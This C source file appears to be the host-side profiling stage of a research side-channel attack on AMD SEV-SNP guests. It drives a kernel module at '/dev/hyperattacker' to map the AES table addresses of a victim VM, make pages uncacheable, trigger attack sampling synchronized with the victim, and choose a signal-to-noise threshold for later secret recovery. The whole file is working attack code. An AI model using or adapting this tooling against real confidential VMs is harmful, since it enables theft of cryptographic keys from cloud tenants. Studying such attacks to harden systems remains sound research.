#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <sched.h>
#include "../../host-module/main.h"
#include "../../host-utils/user-utils.h"

#define MAX_ENC_NUM (int)2000
#define DRANGE_CANDIDATE_NUM (int)2000

long double calculate_mean(int64_t *arr, size_t size) {
    long double sum = 0.0;
    for (size_t i = 0; i < size; ++i) {
        sum += (long double)arr[i];
    }
    return sum / size;
}

long double calculate_variance(int64_t *arr, size_t size) {
    if (size == 0) {
        return 0.0;
    }

    long double mean = calculate_mean(arr, size);
    long double variance_sum = 0.0;

    for (size_t i = 0; i < size; ++i) {
        variance_sum += ((long double)arr[i] - mean) * ((long double)arr[i] - mean);
    }

    return variance_sum / size;
}

static int Te = 0;
static int N_profile = 0;
char ROOT_DIR[128] = {0};
unsigned int samples[SAMPLE_N] = {0};

int64_t d_range_loads_number[2][DRANGE_CANDIDATE_NUM][MAX_ENC_NUM] = {0};

uint64_t table_gPA[4];
uint64_t table_ptr[4];
uint64_t trigger_gPA;
uint64_t trigger_ptr;

void get_gPAs(){
    FILE *fptr;
    char filename[1024] = {0};
    sprintf(filename, "%s/aes-profile/gpas/address", ROOT_DIR);
       fptr = fopen(filename, "r");
    fscanf(fptr, "%lx%lx%lx%lx", &table_gPA[0], &table_gPA[1], &table_gPA[2], &table_gPA[3]);
    fscanf(fptr, "%lx", &trigger_gPA);
    fclose(fptr);
}

void parse_args(int argc, char *argv[]){
    int opt;
    enum { CHARACTER_MODE, WORD_MODE, LINE_MODE } mode = CHARACTER_MODE;

    while ((opt = getopt(argc, argv, "t:n:")) != -1) {
        switch (opt) {
            case 't': {
                Te = atoi(optarg);
                break;
            }
            case 'n': {
                N_profile = atoi(optarg);
                break;
            }
            default: {
                fprintf(stderr, "Usage: %s [] [file...]\n", argv[0]);
                exit(EXIT_FAILURE);
            }
        }
    }
}

int set_uc(int host_module_fd, uint64_t adrs){
    struct kernel_ptr_request req;
    req.ptr = adrs;
    ioctl(host_module_fd, SET_UC, (uint64_t)&req);
    return 0;
}

int set_c(int host_module_fd, uint64_t adrs){
    struct kernel_ptr_request req;
    req.ptr = adrs;
    ioctl(host_module_fd, SET_C, (uint64_t)&req);
    return 0;
}


int main(int argc, char *argv[]){
    get_data_from_json(ROOT_DIR);
    parse_args(argc, argv);

    get_gPAs();

    int host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    if(host_module_fd == -1){
        printf("Error in opening file \n");
        exit(-1);
    }
    for(int i = 0; i < 4; i++){
        struct kernel_ptr_request req;
        req.gpa = table_gPA[i];
        ioctl(host_module_fd, GET_KERNEL_PTR_SNP, (uint64_t)&req);
        table_ptr[i] = req.ptr;
    }
#if NOCACHE == 1
    if(set_uc(host_module_fd, table_ptr[0]) < 0){
        return -1;
    }
#endif

    struct kernel_ptr_request req;
    req.gpa = trigger_gPA;
    ioctl(host_module_fd, GET_KERNEL_PTR, (uint64_t)&req);
    trigger_ptr = req.ptr;
    close(host_module_fd);

    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    sync_write(host_module_fd, trigger_ptr, HYPERVISOR_TRIGGER);
    while(1){
        if(sync_read(host_module_fd, trigger_ptr) != HYPERVISOR_TRIGGER){
            break;
        }
    }
    close(host_module_fd);

    char filename[256] = {0};
    FILE *d_range_loads_number_access_m_fptr;
    sprintf(filename, "%s/aes-profile/result/d_range_loads_number_Te%d_access_m", ROOT_DIR, Te);
    d_range_loads_number_access_m_fptr = fopen(filename, "w");

    FILE *d_range_loads_number_not_access_m_fptr;
    sprintf(filename, "%s/aes-profile/result/d_range_loads_number_Te%d_not_access_m", ROOT_DIR, Te);
    d_range_loads_number_not_access_m_fptr = fopen(filename, "w");

    for(int i = 0; i < N_profile; i++){
        for(int c = 0; c < 2; c++){
            int vm_has_executed = 0;

            host_module_fd = open("/dev/hyperattacker", O_RDONLY);
            struct attack_request req;
            req.addr = table_ptr[Te];
            req.trigger = trigger_ptr;
            req.number = SAMPLE_N;
            req.ret = 0;
            ioctl(host_module_fd, ATTACK_WITH_TRIGGER, (uint64_t)&req);
            vm_has_executed = req.ret;

            // Wait until the victim finished
            while(1){
                if(sync_read(host_module_fd, trigger_ptr) != HYPERVISOR_TRIGGER){
                    break;
                }
            }

            // Check if the victim had finished before the ioctl finished.
            if(vm_has_executed == 0){
                // send the failure signal to the victim and wait until the victim respond.
                sync_write(host_module_fd, trigger_ptr, RESTART);
                while(sync_read(host_module_fd, trigger_ptr) == RESTART){
                }
                c--;
                close(host_module_fd);
                continue;
            }else{
                // if sync suceeded, record the result and run the next one.
                // send the success signal to the victim and wait until the victim respond.
                sync_write(host_module_fd, trigger_ptr, NEXT);
                while(sync_read(host_module_fd, trigger_ptr) == NEXT){
                }
            }

            // Prepare ioctl command and argument
            struct sample_request sample_req;
            sample_req.addr = (uint64_t)samples;
            sample_req.number = SAMPLE_N;
            ioctl(host_module_fd, SAMPLES_COPY_TO_USER, (uint64_t)&sample_req);
            close(host_module_fd);

            uint64_t hist[2000] = {0};
            for(int j = 0; j < SAMPLE_N; j++){
                if(samples[j] >= 0 && samples[j] < 2000){
                    hist[samples[j]]++;
                }
            }

            int64_t Accum = 0;
            for(int bound = 2000 - 1; bound >= 0; bound--){
                Accum += hist[bound];
                d_range_loads_number[c][bound][i] = Accum;
            }
			
        for(int bound = 0; bound < 2000; bound++){
			if(c == 0){
            	fprintf(d_range_loads_number_access_m_fptr, "%ld ",  d_range_loads_number[0][bound][i]);
			}else{
                fprintf(d_range_loads_number_not_access_m_fptr, "%ld ",  d_range_loads_number[1][bound][i]);
			}
        }
			if(c == 0){
        fprintf(d_range_loads_number_access_m_fptr, "\n");
}else{
        fprintf(d_range_loads_number_not_access_m_fptr, "\n");
}
        }
        printProgressBar(i + 1, N_profile, 50);
    }
    printf("\n");



#if NOCACHE == 1
    if(set_c(host_module_fd, table_ptr[0]) < 0){
        return -1;
    }
#endif

    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    sync_write(host_module_fd, trigger_ptr, TERMINATE);
    while(1){
        if(sync_read(host_module_fd, trigger_ptr) != TERMINATE){
            break;
        }
    }
    close(host_module_fd);

    // identify optimal d-range
    long double maximum_SNR = 0;
    int maximum_bound = 0;
    for(int bound = 2000 - 1; bound >= 0; bound--){
        long double access_m_mean = calculate_mean(d_range_loads_number[0][bound], N_profile);
        long double not_access_m_mean = calculate_mean(d_range_loads_number[1][bound], N_profile);
        long double access_m_var = calculate_variance(d_range_loads_number[0][bound], N_profile);
        long double not_access_m_var = calculate_variance(d_range_loads_number[1][bound], N_profile);
        long double mean = (access_m_mean + not_access_m_mean) / 2;
        long double var_signal = ((access_m_mean - mean)*(access_m_mean - mean) + (not_access_m_mean - mean)*(not_access_m_mean - mean)) / 2;
        long double var_noise = ((access_m_var + not_access_m_var) / 2);
        long double SNR = var_signal / var_noise;
        if(SNR >= maximum_SNR){
            maximum_SNR = SNR;
            maximum_bound = bound;
        }
    }
    sprintf(filename, "%s/aes-profile/result/d_range_lowerbound_Te%d", ROOT_DIR, Te);
    FILE *fptr_d_range_lowerbound = fopen(filename, "w");
    fprintf(fptr_d_range_lowerbound, "%d", maximum_bound);
    fclose(fptr_d_range_lowerbound);

    return 0;
}


